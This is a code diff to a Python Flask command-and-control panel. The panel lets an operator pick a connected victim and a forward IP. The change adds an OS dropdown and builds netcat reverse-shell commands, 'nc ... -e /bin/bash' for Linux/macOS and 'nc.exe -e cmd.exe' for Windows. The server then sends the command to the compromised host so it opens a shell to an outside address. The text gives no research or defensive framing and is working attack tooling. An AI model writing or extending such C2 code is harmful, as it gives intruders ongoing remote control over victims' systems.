@@ -81,6 +81,10 @@ HTML_TEMPLATE = """
                         <form action="/forward" method="post" style="display: inline;">
                             <input type="hidden" name="id" value="{{ id }}">
                             <input type="text" name="forward_ip" placeholder="Forward IP" required style="margin-bottom: 5px;">
+                            <select name="command" required style="margin-bottom: 5px;">
+                                <option value="bash">Linux / macOS</option>
+                                <option value="cmd">Windows</option>
+                            </select>
                             <input type="submit" value="Forward" style="background-color: #007bff; color: white; border: none; padding: 5px 10px; cursor: pointer; margin-bottom: 5px;">
                         </form>
                     </div>
@@ -95,7 +99,6 @@ HTML_TEMPLATE = """
     </div>
 </body>
 </html>
-        
 """
 
 # Route to display the web interface
@@ -120,12 +123,17 @@ def drop():
 def forward():
     conn_id = request.form['id']
     forward_ip = request.form['forward_ip']
+    command_type = request.form['command']
     
     conn_id = int(conn_id)  # Convert ID to integer
     if conn_id in connections:
         conn, addr = connections[conn_id]
         try:
-            command = f"nc {forward_ip} 4444 -e /bin/bash"  # Default to Bash reverse shell
+            if command_type == 'bash':
+                command = f"nc {forward_ip} 4444 -e /bin/bash"  # Default to Bash reverse shell
+            elif command_type == 'cmd':
+                command = f"C:\\Windows\\Temp\\nc.exe -e cmd.exe {forward_ip} 4444"  # Windows CMD reverse shell
+            
             conn.sendall(command.encode('utf-8') + b'\n')
             return "Forwarding command sent"
         except Exception as e:
@@ -177,4 +185,4 @@ def start_c2_server():
 if __name__ == '__main__':
     threading.Thread(target=start_c2_server, daemon=True).start()
     app.run(host='0.0.0.0', port=5000)
-                            
+                                    
